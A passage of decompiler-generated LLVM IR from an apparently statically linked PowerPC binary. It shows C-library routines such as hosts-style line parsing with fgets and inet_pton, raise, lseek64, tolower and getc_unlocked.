  store i32 %v1_10013f10, i32* %r0.global-to-local, align 4
  %v1_10013f14 = add i32 %v0_10013f08, 1
  store i32 %v1_10013f14, i32* @r29, align 4
  %v1_10013f18 = load i32, i32* @r30, align 4
  %v3_10013f18 = add i32 %v1_10013f18, %v1_10013f10
  %v4_10013f18 = inttoptr i32 %v3_10013f18 to i32*
  store i32 %v0_10013f18, i32* %v4_10013f18, align 4
  %v0_10013f249.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013f24.preheader

dec_label_pc_10013f24.preheader:                  ; preds = %dec_label_pc_10013f10, %dec_label_pc_10013f08
  %v0_10013f249 = phi i32 [ %v0_10013f249.pre, %dec_label_pc_10013f10 ], [ %v0_10013f18, %dec_label_pc_10013f08 ]
  %v1_10013f2410 = inttoptr i32 %v0_10013f249 to i8*
  %v2_10013f2411 = load i8, i8* %v1_10013f2410, align 1
  %v3_10013f2412 = zext i8 %v2_10013f2411 to i32
  store i32 %v3_10013f2412, i32* %r0.global-to-local, align 4
  %v3_10013f2814 = icmp eq i8 %v2_10013f2411, 0
  br i1 %v3_10013f2814, label %dec_label_pc_10013f48.loopexit, label %dec_label_pc_10013f34.lr.ph

dec_label_pc_10013f34.lr.ph:                      ; preds = %dec_label_pc_10013f24.preheader
  %v3_10013f38.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10013f34

dec_label_pc_10013f20:                            ; preds = %dec_label_pc_10013f34
  %v1_10013f20 = add i32 %v0_10013f20, 1
  store i32 %v1_10013f20, i32* %r11.global-to-local, align 4
  %v1_10013f24 = inttoptr i32 %v1_10013f20 to i8*
  %v2_10013f24 = load i8, i8* %v1_10013f24, align 1
  %v3_10013f24 = zext i8 %v2_10013f24 to i32
  store i32 %v3_10013f24, i32* %r0.global-to-local, align 4
  %v3_10013f28 = icmp eq i8 %v2_10013f24, 0
  br i1 %v3_10013f28, label %dec_label_pc_10013f48.loopexit, label %dec_label_pc_10013f34

dec_label_pc_10013f34:                            ; preds = %dec_label_pc_10013f34.lr.ph, %dec_label_pc_10013f20
  %v0_10013f20 = phi i32 [ %v0_10013f249, %dec_label_pc_10013f34.lr.ph ], [ %v1_10013f20, %dec_label_pc_10013f20 ]
  %v0_10013f3c.in = phi i32 [ %v3_10013f2412, %dec_label_pc_10013f34.lr.ph ], [ %v3_10013f24, %dec_label_pc_10013f20 ]
  %v0_10013f3c = mul nuw nsw i32 %v0_10013f3c.in, 2
  store i32 %v3_10013f38.pre, i32* %r9.global-to-local, align 4
  %v2_10013f3c = add i32 %v0_10013f3c, %v3_10013f38.pre
  %v3_10013f3c = inttoptr i32 %v2_10013f3c to i16*
  %v4_10013f3c = load i16, i16* %v3_10013f3c, align 2
  %v5_10013f3c = zext i16 %v4_10013f3c to i32
  store i32 %v5_10013f3c, i32* %r0.global-to-local, align 4
  %v1_10013f40 = and i32 %v5_10013f3c, 32
  store i32 %v1_10013f40, i32* %r9.global-to-local, align 4
  %v3_10013f40 = icmp eq i32 %v1_10013f40, 0
  br i1 %v3_10013f40, label %dec_label_pc_10013f20, label %dec_label_pc_10013f48.loopexit

dec_label_pc_10013f48.loopexit:                   ; preds = %dec_label_pc_10013f34, %dec_label_pc_10013f20, %dec_label_pc_10013f24.preheader
  %v0_10013f48 = phi i32 [ %v0_10013f249, %dec_label_pc_10013f24.preheader ], [ %v0_10013f20, %dec_label_pc_10013f34 ], [ %v1_10013f20, %dec_label_pc_10013f20 ]
  %v1_10013f48 = inttoptr i32 %v0_10013f48 to i8*
  %v2_10013f48 = load i8, i8* %v1_10013f48, align 1
  %v3_10013f48 = zext i8 %v2_10013f48 to i32
  store i32 %v3_10013f48, i32* %r0.global-to-local, align 4
  %v3_10013f4c = icmp eq i8 %v2_10013f48, 0
  br i1 %v3_10013f4c, label %dec_label_pc_10013f54, label %dec_label_pc_10013ee4.preheader

dec_label_pc_10013ee4.preheader:                  ; preds = %dec_label_pc_10013ecc, %dec_label_pc_10013f48.loopexit
  %v0_10013ee42 = phi i32 [ %v0_10013f48, %dec_label_pc_10013f48.loopexit ], [ %v0_10013ecc, %dec_label_pc_10013ecc ]
  %v1_10013ee43 = inttoptr i32 %v0_10013ee42 to i8*
  %v2_10013ee44 = load i8, i8* %v1_10013ee43, align 1
  %v3_10013ee45 = zext i8 %v2_10013ee44 to i32
  store i32 %v3_10013ee45, i32* %r0.global-to-local, align 4
  %v3_10013ee87 = icmp eq i8 %v2_10013ee44, 0
  br i1 %v3_10013ee87, label %dec_label_pc_10013f54, label %dec_label_pc_10013ef4

dec_label_pc_10013f54:                            ; preds = %dec_label_pc_10013f48.loopexit, %dec_label_pc_10013ee4.preheader, %dec_label_pc_10013ed8, %dec_label_pc_10013ecc
  %v0_10013f54 = load i32, i32* @r29, align 4
  %v1_10013f58 = mul i32 %v0_10013f54, 4
  store i32 %v1_10013f58, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10013f60 = load i32, i32* @r30, align 4
  %v3_10013f60 = add i32 %v2_10013f60, %v1_10013f58
  %v4_10013f60 = inttoptr i32 %v3_10013f60 to i32*
  store i32 0, i32* %v4_10013f60, align 4
  %tmp55 = icmp slt i32 %v0_10013f54, 2
  br i1 %tmp55, label %dec_label_pc_10014008, label %dec_label_pc_10013f68

dec_label_pc_10013f68:                            ; preds = %dec_label_pc_10013f54
  %v0_10013f68 = load i32, i32* %r18.global-to-local, align 4
  %v3_10013f68 = icmp eq i32 %v0_10013f68, 1
  br i1 %v3_10013f68, label %dec_label_pc_10014020, label %dec_label_pc_10013f70

dec_label_pc_10013f70:                            ; preds = %dec_label_pc_10013f68
  %v3_10013f70 = icmp eq i32 %v0_10013f68, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10013f70, label %dec_label_pc_10013f7c, label %dec_label_pc_10013fa8.preheader

dec_label_pc_10013fa8.preheader:                  ; preds = %dec_label_pc_10013f70
  %v1_10013fa823 = load i32, i32* @r29, align 4
  %v2_10013fa824 = icmp sgt i32 %v1_10013fa823, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10013fb029 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10013fb029, i32* @r3, align 4
  br i1 %v2_10013fa824, label %dec_label_pc_10013f94, label %dec_label_pc_10013fb8

dec_label_pc_10013f7c:                            ; preds = %dec_label_pc_10013f70
  %v0_10013f7c = load i32, i32* @r30, align 4
  %v1_10013f7c = inttoptr i32 %v0_10013f7c to i32*
  %v2_10013f7c = load i32, i32* %v1_10013f7c, align 4
  store i32 %v2_10013f7c, i32* @r4, align 4
  %v0_10013f80 = load i32, i32* %r15.global-to-local, align 4
  %v2_10013f84 = inttoptr i32 %v0_10013f80 to i8*
  %v3_10013f84 = call i32 @__GI_strcoll(i8* %v2_10013f84, i32 %v2_10013f7c)
  %v3_10013f88 = icmp eq i32 %v3_10013f84, 0
  br i1 %v3_10013f88, label %dec_label_pc_10013fc0, label %dec_label_pc_10014008

dec_label_pc_10013f94:                            ; preds = %dec_label_pc_10013fa8.preheader, %dec_label_pc_10013fa4
  %v1_10013f94 = phi i32 [ %v1_10013fac, %dec_label_pc_10013fa4 ], [ 4, %dec_label_pc_10013fa8.preheader ]
  %v0_10013fb031 = phi i32 [ %v0_10013fb0, %dec_label_pc_10013fa4 ], [ %v0_10013fb029, %dec_label_pc_10013fa8.preheader ]
  %v0_10013f94 = load i32, i32* @r30, align 4
  %v2_10013f94 = add i32 %v0_10013f94, %v1_10013f94
  %v3_10013f94 = inttoptr i32 %v2_10013f94 to i32*
  %v4_10013f94 = load i32, i32* %v3_10013f94, align 4
  store i32 %v4_10013f94, i32* @r4, align 4
  %v2_10013f98 = call i32 @__GI_strcasecmp(i32 %v0_10013fb031, i32 %v4_10013f94)
  %v3_10013f9c = icmp eq i32 %v2_10013f98, 0
  %v0_10013fb8.pre = load i32, i32* @r31, align 4
  br i1 %v3_10013f9c, label %dec_label_pc_10013f94.dec_label_pc_10013fb8_crit_edge, label %dec_label_pc_10013fa4

dec_label_pc_10013fa4:                            ; preds = %dec_label_pc_10013f94
  %v1_10013fa4 = add i32 %v0_10013fb8.pre, 1
  store i32 %v1_10013fa4, i32* @r31, align 4
  %v1_10013fa8 = load i32, i32* @r29, align 4
  %v2_10013fa8 = icmp slt i32 %v1_10013fa4, %v1_10013fa8
  %v1_10013fac = mul i32 %v1_10013fa4, 4
  store i32 %v1_10013fac, i32* %r0.global-to-local, align 4
  %v0_10013fb0 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10013fb0, i32* @r3, align 4
  br i1 %v2_10013fa8, label %dec_label_pc_10013f94, label %dec_label_pc_10013fb8

dec_label_pc_10013f94.dec_label_pc_10013fb8_crit_edge: ; preds = %dec_label_pc_10013f94
  %v1_10013fb8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10013fb8

dec_label_pc_10013fb8:                            ; preds = %dec_label_pc_10013fa4, %dec_label_pc_10013f94.dec_label_pc_10013fb8_crit_edge, %dec_label_pc_10013fa8.preheader
  %v1_10013fb8 = phi i32 [ %v1_10013fb8.pre, %dec_label_pc_10013f94.dec_label_pc_10013fb8_crit_edge ], [ %v1_10013fa823, %dec_label_pc_10013fa8.preheader ], [ %v1_10013fa8, %dec_label_pc_10013fa4 ]
  %v0_10013fb8 = phi i32 [ %v0_10013fb8.pre, %dec_label_pc_10013f94.dec_label_pc_10013fb8_crit_edge ], [ 1, %dec_label_pc_10013fa8.preheader ], [ %v1_10013fa4, %dec_label_pc_10013fa4 ]
  %v2_10013fb8 = icmp slt i32 %v0_10013fb8, %v1_10013fb8
  br i1 %v2_10013fb8, label %dec_label_pc_10013fc0, label %dec_label_pc_10014008

dec_label_pc_10013fc0:                            ; preds = %dec_label_pc_10013f7c, %dec_label_pc_10013fb8
  %v0_10013fc0 = load i32, i32* %r19.global-to-local, align 4
  %v3_10013fc0 = icmp eq i32 %v0_10013fc0, 2
  br i1 %v3_10013fc0, label %dec_label_pc_10013fc8, label %dec_label_pc_10013fe4

dec_label_pc_10013fc8:                            ; preds = %dec_label_pc_10013fc0
  %v0_10013fc8 = load i32, i32* @r30, align 4
  %v1_10013fc8 = inttoptr i32 %v0_10013fc8 to i32*
  %v2_10013fc8 = load i32, i32* %v1_10013fc8, align 4
  %v0_10013fd0 = load i32, i32* @r25, align 4
  store i32 268517336, i32* @lr, align 4
  %v3_10013fd4 = inttoptr i32 %v2_10013fc8 to i8*
  %v4_10013fd4 = call i32 @inet_pton(i32 2, i8* %v3_10013fd4, i32 %v0_10013fd0)
  %v2_10013fd8 = icmp sgt i32 %v4_10013fd4, 0
  br i1 %v2_10013fd8, label %dec_label_pc_10013e28, label %dec_label_pc_10014004

dec_label_pc_10013fe4:                            ; preds = %dec_label_pc_10013fc0
  %v3_10013fe4 = icmp eq i32 %v0_10013fc0, 10
  br i1 %v3_10013fe4, label %dec_label_pc_10013fec, label %dec_label_pc_10014004

dec_label_pc_10013fec:                            ; preds = %dec_label_pc_10013fe4
  %v0_10013fec = load i32, i32* @r30, align 4
  %v1_10013fec = inttoptr i32 %v0_10013fec to i32*
  %v2_10013fec = load i32, i32* %v1_10013fec, align 4
  %v0_10013ff4 = load i32, i32* %r21.global-to-local, align 4
  store i32 268517372, i32* @lr, align 4
  %v3_10013ff8 = inttoptr i32 %v2_10013fec to i8*
  %v4_10013ff8 = call i32 @inet_pton(i32 10, i8* %v3_10013ff8, i32 %v0_10013ff4)
  %v2_10013ffc = icmp sgt i32 %v4_10013ff8, 0
  br i1 %v2_10013ffc, label %dec_label_pc_10013e58, label %dec_label_pc_10014004

dec_label_pc_10014004:                            ; preds = %dec_label_pc_10013fc8, %dec_label_pc_10013fe4, %dec_label_pc_10013fec
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10014008

dec_label_pc_10014008:                            ; preds = %dec_label_pc_10013fb8, %dec_label_pc_10013f7c, %dec_label_pc_10013f54, %dec_label_pc_10014004, %dec_label_pc_10013ea0
  %v0_10014008 = load i32, i32* @r24, align 4
  %v0_1001400c = load i32, i32* @r27, align 4
  %v0_10014010 = load i32, i32* @r20, align 4
  store i32 268517400, i32* @lr, align 4
  %v3_10014014 = call i32 @fgets(i32 %v0_10014008, i32 %v0_1001400c, i32 %v0_10014010)
  %v3_10014018 = icmp eq i32 %v3_10014014, 0
  br i1 %v3_10014018, label %dec_label_pc_10014020, label %dec_label_pc_10013eb0

dec_label_pc_10014020:                            ; preds = %dec_label_pc_10014008, %dec_label_pc_10013f68, %dec_label_pc_10013e84
  %v0_10014020 = load i32, i32* %r18.global-to-local, align 4
  %v3_10014020 = icmp eq i32 %v0_10014020, 1
  br i1 %v3_10014020, label %dec_label_pc_10014038, label %dec_label_pc_10014028

dec_label_pc_10014028:                            ; preds = %dec_label_pc_10014020
  %v0_10014028 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10014030.856 to i32), i32* @lr, align 4
  %v1_1001402c = inttoptr i32 %v0_10014028 to i16*
  %v2_1001402c = call i32 @__GI_fclose(i16* %v1_1001402c)
  br label %dec_label_pc_10014038

dec_label_pc_10014034:                            ; preds = %dec_label_pc_10013dec, %dec_label_pc_10013dbc, %dec_label_pc_10013db4, %dec_label_pc_10013da8, %dec_label_pc_10013d98, %dec_label_pc_10013d80, %dec_label_pc_10013d70
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10014038

dec_label_pc_10014038:                            ; preds = %dec_label_pc_10014020, %dec_label_pc_10014028, %dec_label_pc_10013e18, %dec_label_pc_10014034
  store i32 %v0_10013d34, i32* %r0.global-to-local, align 4
  %v0_1001403c = load i32, i32* @r26, align 4
  ret i32 %v0_1001403c

; uselistorder directives
  uselistorder i32 %v0_10013fb0, { 1, 0 }
  uselistorder i32 %v1_10013fa4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10013f58, { 1, 0 }
  uselistorder i32 %v0_10013f54, { 1, 0 }
  uselistorder i32 %v3_10013ee45, { 1, 0 }
  uselistorder i32 %v0_10013ee42, { 1, 0 }
  uselistorder i32 %v1_10013f10, { 1, 0 }
  uselistorder i32 %v0_10013f08, { 1, 0, 2 }
  uselistorder i32 %v2_10013eb8, { 1, 0 }
  uselistorder i32 %v0_10013da8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10013d80.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10013d4c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 6, 7, 10, 1, 2, 3, 8, 9, 5, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 10, { 10, 34, 35, 36, 37, 38, 39, 40, 21, 22, 18, 19, 20, 42, 41, 43, 44, 5, 45, 1, 28, 2, 29, 0, 6, 11, 46, 12, 23, 13, 24, 25, 7, 30, 31, 14, 4, 17, 26, 27, 15, 3, 9, 8, 33, 16, 32 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 6, { 29, 30, 31, 32, 33, 0, 1, 2, 19, 20, 21, 22, 10, 11, 34, 3, 25, 26, 6, 4, 27, 12, 28, 5, 13, 14, 15, 16, 7, 8, 17, 23, 24, 9, 18 }
  uselistorder i32* @global_var_1002b8c0, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 80, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder i32 48, { 25, 10, 11, 12, 1, 13, 14, 26, 5, 16, 17, 2, 18, 19, 20, 7, 21, 6, 22, 3, 0, 23, 24, 15, 8, 9, 4 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 2, 3, 0, 1 }
  uselistorder i32 -48, { 3, 5, 4, 6, 1, 2, 0 }
  uselistorder i32* @r27, { 46, 47, 48, 49, 50, 51, 1, 52, 53, 54, 55, 12, 13, 6, 14, 3, 2, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 44, 45, 23, 24, 88, 4, 89, 7, 90, 95, 15, 16, 82, 83, 84, 85, 86, 87, 91, 92, 93, 25, 26, 27, 28, 5, 29, 30, 31, 32, 8, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 9, 10, 11, 94, 21, 22, 17, 18, 19, 20 }
  uselistorder i32 32, { 55, 56, 57, 28, 58, 59, 29, 60, 61, 62, 63, 17, 18, 64, 65, 43, 30, 27, 44, 54, 14, 15, 39, 40, 38, 2, 3, 4, 16, 13, 45, 46, 31, 47, 48, 49, 50, 51, 52, 53, 0, 66, 67, 23, 22, 1, 21, 41, 24, 32, 42, 33, 6, 5, 8, 19, 7, 34, 35, 10, 20, 9, 36, 25, 26, 12, 11, 37 }
  uselistorder i32* @r10, { 1, 2, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10014038, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10014008, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10014004, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10013fb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013f94, { 1, 0 }
  uselistorder label %dec_label_pc_10013f54, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10013ee4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10013f34, { 1, 0 }
  uselistorder label %dec_label_pc_10013ecc, { 1, 0 }
  uselistorder label %dec_label_pc_10013ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10013e84, { 1, 0 }
  uselistorder label %dec_label_pc_10013dec, { 1, 0 }
  uselistorder label %dec_label_pc_10013d80, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10014050 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268517480, i32* @lr, align 4
  %v0_10014064 = call i32 @__libc_getpid()
  %v0_1001406c = load i32, i32* @r29, align 4
  store i32 %v0_10014050, i32* @lr, align 4
  %v2_1001407c = call i32 @kill(i32 %v0_10014064, i32 %v0_1001406c)
  ret i32 %v2_1001407c

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10014080 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_100140ac = call i32 @__asm_mfcr()
  %v1_100140b0 = and i32 %v0_100140ac, 268435456
  %v3_100140b0 = icmp eq i32 %v1_100140b0, 0
  store i32 %v0_100140ac, i32* %r31.global-to-local, align 4
  store i32 %v0_100140ac, i32* %r0.global-to-local, align 4
  br i1 %v3_100140b0, label %dec_label_pc_100140d4, label %dec_label_pc_100140c4

dec_label_pc_100140c4:                            ; preds = %entry
  %v0_100140c4 = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_100140cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100140cc = inttoptr i32 %v0_100140c4 to i32*
  store i32 %v0_100140cc, i32* %v2_100140cc, align 4
  %v0_100140d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100140d8

dec_label_pc_100140d4:                            ; preds = %entry
  %v3_100140bc = icmp eq i32 %v0_100140ac, 0
  br i1 %v3_100140bc, label %dec_label_pc_100140e4, label %dec_label_pc_100140d8

dec_label_pc_100140d8:                            ; preds = %dec_label_pc_100140d4, %dec_label_pc_100140c4
  %v0_100140d8 = phi i32 [ %v0_100140ac, %dec_label_pc_100140d4 ], [ %v0_100140d8.pre, %dec_label_pc_100140c4 ]
  %tmp = icmp slt i32 %v0_100140d8, 0
  %v1_100140dc = zext i1 %tmp to i32
  %v2_100140dc = ashr i32 %v0_100140d8, 31
  %v3_100140dc = and i32 %v2_100140dc, -2
  %v4_100140dc = or i32 %v3_100140dc, %v1_100140dc
  br label %dec_label_pc_100140ec

dec_label_pc_100140e4:                            ; preds = %dec_label_pc_100140d4
  %v3_100140e4 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100140ec

dec_label_pc_100140ec:                            ; preds = %dec_label_pc_100140d8, %dec_label_pc_100140e4
  %v0_100140fc = phi i32 [ %v4_100140dc, %dec_label_pc_100140d8 ], [ %v3_100140e4, %dec_label_pc_100140e4 ]
  store i32 %v0_10014080, i32* %r0.global-to-local, align 4
  ret i32 %v0_100140fc

; uselistorder directives
  uselistorder i32 %v0_100140d8, { 1, 0 }
  uselistorder i32 %v0_100140ac, { 0, 3, 2, 1, 4 }
  uselistorder i32 31, { 11, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 12, 13, 1, 2, 45, 46, 14, 30, 31, 8, 9, 3, 4, 0, 6, 5, 15, 16, 17, 49, 50, 47, 48, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 7, 10, 32, 33 }
  uselistorder i32 268435456, { 7, 14, 19, 8, 4, 22, 23, 24, 25, 16, 21, 5, 20, 0, 12, 13, 1, 9, 27, 17, 10, 18, 30, 6, 11, 15, 2, 3, 26, 28, 29, 31 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100140ec, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014100 = add i32 %arg1, 128
  %v1_10014104 = mul i32 %arg1, 2
  %v2_10014108 = icmp ugt i32 %v1_10014100, 383
  %v0_1001410c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10014108, i32 %v0_1001410c)
  %v3_10014114 = load i32, i32* bitcast (i32** @global_var_1002b8f4.736 to i32*), align 4
  %v2_10014118 = add i32 %v1_10014104, %v3_10014114
  %v3_10014118 = inttoptr i32 %v2_10014118 to i16*
  %v4_10014118 = load i16, i16* %v3_10014118, align 2
  %v5_10014118 = sext i16 %v4_10014118 to i32
  ret i32 %v5_10014118

; uselistorder directives
  uselistorder i32 383, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10014120 = load i32, i32* @lr, align 4
  store i32 %v0_10014120, i32* %r0.global-to-local, align 4
  %v0_10014128 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10014134 = add i32 %tmp, 16
  %v3_10014134 = inttoptr i32 %v2_10014134 to i32*
  %v4_10014134 = load i32, i32* %v3_10014134, align 4
  store i32 %v4_10014134, i32* %r9.global-to-local, align 4
  %v2_10014138 = add i32 %tmp, 24
  %v3_10014138 = inttoptr i32 %v2_10014138 to i32*
  %v4_10014138 = load i32, i32* %v3_10014138, align 4
  store i32 %v4_10014138, i32* %r0.global-to-local, align 4
  %v2_1001413c = icmp ult i32 %v4_10014134, %v4_10014138
  br i1 %v2_1001413c, label %dec_label_pc_100141a4, label %dec_label_pc_10014144

dec_label_pc_10014144:                            ; preds = %entry
  %v3_10014144 = load i16, i16* %arg1, align 2
  %v4_10014144 = zext i16 %v3_10014144 to i32
  %v1_10014148 = and i32 %v4_10014144, 131
  store i32 %v1_10014148, i32* %r0.global-to-local, align 4
  %v2_1001414c = icmp ugt i32 %v1_10014148, 128
  br i1 %v2_1001414c, label %dec_label_pc_10014164, label %dec_label_pc_10014154

dec_label_pc_10014154:                            ; preds = %dec_label_pc_10014144
  store i32 268517724, i32* @lr, align 4
  %v3_10014158 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10014134)
  store i32 %v3_10014158, i32* %r3.global-to-local, align 4
  %v3_1001415c = icmp eq i32 %v3_10014158, 0
  br i1 %v3_1001415c, label %dec_label_pc_10014154.dec_label_pc_10014164_crit_edge, label %dec_label_pc_10014240

dec_label_pc_10014154.dec_label_pc_10014164_crit_edge: ; preds = %dec_label_pc_10014154
  %v0_10014164.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10014164

dec_label_pc_10014164:                            ; preds = %dec_label_pc_10014154.dec_label_pc_10014164_crit_edge, %dec_label_pc_10014144
  %v2_100141c4 = phi i32 [ %v0_10014164.pre, %dec_label_pc_10014154.dec_label_pc_10014164_crit_edge ], [ %tmp, %dec_label_pc_10014144 ]
  %v1_10014164 = inttoptr i32 %v2_100141c4 to i16*
  %v2_10014164 = load i16, i16* %v1_10014164, align 2
  %v3_10014164 = zext i16 %v2_10014164 to i32
  %v1_10014168 = and i32 %v3_10014164, 2
  store i32 %v1_10014168, i32* %r0.global-to-local, align 4
  %v3_10014168 = icmp eq i32 %v1_10014168, 0
  br i1 %v3_10014168, label %dec_label_pc_10014194, label %dec_label_pc_10014170

dec_label_pc_10014170:                            ; preds = %dec_label_pc_10014164
  %v1_10014170 = call i32 @__asm_rlwinm(i32 %v3_10014164, i32 2, i32 29, i32 29)
  %v1_10014174 = load i32, i32* @r31, align 4
  %v2_10014174 = add i32 %v1_10014174, %v1_10014170
  store i32 %v2_10014174, i32* %r9.global-to-local, align 4
  %v1_10014178 = add i32 %v2_10014174, 39
  %v2_10014178 = inttoptr i32 %v1_10014178 to i8*
  %v3_10014178 = load i8, i8* %v2_10014178, align 1
  %v4_10014178 = zext i8 %v3_10014178 to i32
  store i32 %v4_10014178, i32* %r0.global-to-local, align 4
  %v1_1001417c = add nsw i32 %v3_10014164, -1
  store i32 %v1_1001417c, i32* %r9.global-to-local, align 4
  %v1_10014180 = trunc i32 %v1_1001417c to i16
  %v3_10014180 = inttoptr i32 %v1_10014174 to i16*
  store i16 %v1_10014180, i16* %v3_10014180, align 2
  %v0_10014184 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10014184, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001418c = load i32, i32* @r31, align 4
  %v2_1001418c = add i32 %v1_1001418c, 40
  %v3_1001418c = inttoptr i32 %v2_1001418c to i32*
  store i32 0, i32* %v3_1001418c, align 4
  br label %dec_label_pc_10014244

dec_label_pc_10014194:                            ; preds = %dec_label_pc_10014164
  %v1_10014194 = add i32 %v2_100141c4, 16
  %v2_10014194 = inttoptr i32 %v1_10014194 to i32*
  %v3_10014194 = load i32, i32* %v2_10014194, align 4
  store i32 %v3_10014194, i32* %r9.global-to-local, align 4
  %v1_10014198 = add i32 %v2_100141c4, 20
  %v2_10014198 = inttoptr i32 %v1_10014198 to i32*
  %v3_10014198 = load i32, i32* %v2_10014198, align 4
  store i32 %v3_10014198, i32* %r0.global-to-local, align 4
  %v4_1001419c = icmp eq i32 %v3_10014198, %v3_10014194
  br i1 %v4_1001419c, label %dec_label_pc_100141b0, label %dec_label_pc_100141a4

dec_label_pc_100141a4:                            ; preds = %dec_label_pc_10014194, %entry
  %v1_100142187 = phi i32 [ %v2_100141c4, %dec_label_pc_10014194 ], [ %tmp, %entry ]
  %v0_100141a4 = phi i32 [ %v3_10014194, %dec_label_pc_10014194 ], [ %v4_10014134, %entry ]
  %v1_100141a4 = inttoptr i32 %v0_100141a4 to i8*
  %v2_100141a4 = load i8, i8* %v1_100141a4, align 1
  %v3_100141a4 = zext i8 %v2_100141a4 to i32
  store i32 %v3_100141a4, i32* %r3.global-to-local, align 4
  %v1_100141a8 = add i32 %v0_100141a4, 1
  store i32 %v1_100141a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10014218

dec_label_pc_100141b0:                            ; preds = %dec_label_pc_10014194
  %v1_100141b0 = add i32 %v2_100141c4, 4
  %v2_100141b0 = inttoptr i32 %v1_100141b0 to i32*
  %v3_100141b0 = load i32, i32* %v2_100141b0, align 4
  store i32 %v3_100141b0, i32* %r0.global-to-local, align 4
  %v3_100141b4 = icmp eq i32 %v3_100141b0, -2
  br i1 %v3_100141b4, label %dec_label_pc_100141bc, label %dec_label_pc_100141cc

dec_label_pc_100141bc:                            ; preds = %dec_label_pc_100141b0
  %v1_100141bc = or i32 %v3_10014164, 4
  store i32 %v1_100141bc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100141c4 = trunc i32 %v1_100141bc to i16
  store i16 %v1_100141c4, i16* %v1_10014164, align 2
  br label %dec_label_pc_10014244

dec_label_pc_100141cc:                            ; preds = %dec_label_pc_100141b0
  %v1_100141cc = and i32 %v3_10014164, 768
  store i32 %v1_100141cc, i32* %r0.global-to-local, align 4
